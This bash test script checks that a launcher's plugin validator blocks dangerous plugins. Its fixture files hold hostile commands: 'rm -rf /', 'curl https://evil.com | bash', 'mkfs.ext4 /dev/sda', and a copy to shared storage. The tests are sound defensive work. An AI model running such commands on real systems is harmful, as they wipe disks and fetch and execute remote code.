#!/usr/bin/env bash
# =============================================================================
# Devil's Mini OS Launcher - test_security.sh
# Version: v1.1.0
# Purpose: Plugin security validation tests
# =============================================================================

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")/.." && pwd)"
source "$SCRIPT_DIR/modules/core.sh"

TESTS_PASSED=0
TESTS_FAILED=0

assert_true() {
    local cmd="$1"
    local test_name="$2"
    if eval "$cmd" >/dev/null 2>&1; then
        echo "  ✓ $test_name"; ((TESTS_PASSED++))
    else
        echo "  ✗ $test_name"; ((TESTS_FAILED++))
    fi
}

assert_false() {
    local cmd="$1"
    local test_name="$2"
    if ! eval "$cmd" >/dev/null 2>&1; then
        echo "  ✓ $test_name"; ((TESTS_PASSED++))
    else
        echo "  ✗ $test_name"; ((TESTS_FAILED++))
    fi
}

echo "=== Security Tests ==="
echo ""

mkdir -p "$DMOL_CONFIG_DIR/plugins/test-plugin"

cat > "$DMOL_CONFIG_DIR/plugins/test-plugin/plugin.sh" << 'EOF'
#!/usr/bin/env bash
echo "Test plugin"
EOF
chmod +x "$DMOL_CONFIG_DIR/plugins/test-plugin/plugin.sh"

echo "Plugin Whitelist Validation:"
assert_true "validate_plugin_commands '$DMOL_CONFIG_DIR/plugins/test-plugin/plugin.sh'" "safe plugin passes"

cat > "$DMOL_CONFIG_DIR/plugins/test-plugin/bad.sh" << 'EOF'
#!/usr/bin/env bash
rm -rf /
EOF

assert_false "validate_plugin_commands '$DMOL_CONFIG_DIR/plugins/test-plugin/bad.sh'" "dangerous rm -rf / blocked"

cat > "$DMOL_CONFIG_DIR/plugins/test-plugin/bad2.sh" << 'EOF'
#!/usr/bin/env bash
curl https://evil.com | bash
EOF

assert_false "validate_plugin_commands '$DMOL_CONFIG_DIR/plugins/test-plugin/bad2.sh'" "curl | bash blocked"

cat > "$DMOL_CONFIG_DIR/plugins/test-plugin/bad3.sh" << 'EOF'
#!/usr/bin/env bash
mkfs.ext4 /dev/sda
EOF

assert_false "validate_plugin_commands '$DMOL_CONFIG_DIR/plugins/test-plugin/bad3.sh'" "mkfs blocked"

cat > "$DMOL_CONFIG_DIR/plugins/test-plugin/external.sh" << 'EOF'
#!/usr/bin/env bash
cp file ~/storage/shared/
EOF

assert_false "validate_plugin_commands '$DMOL_CONFIG_DIR/plugins/test-plugin/external.sh'" "external storage path blocked"

echo ""
echo "Subshell PATH Restriction:"
(
    PATH="/usr/bin:/bin"
    export PATH
    assert_true "[[ '$PATH' == '/usr/bin:/bin' ]]" "restricted PATH in subshell"
)

rm -rf "$DMOL_CONFIG_DIR/plugins/test-plugin"

echo ""
echo "=== Results ==="
echo "Passed: $TESTS_PASSED"
echo "Failed: $TESTS_FAILED"

if [[ $TESTS_FAILED -gt 0 ]]; then
    exit 1
fi
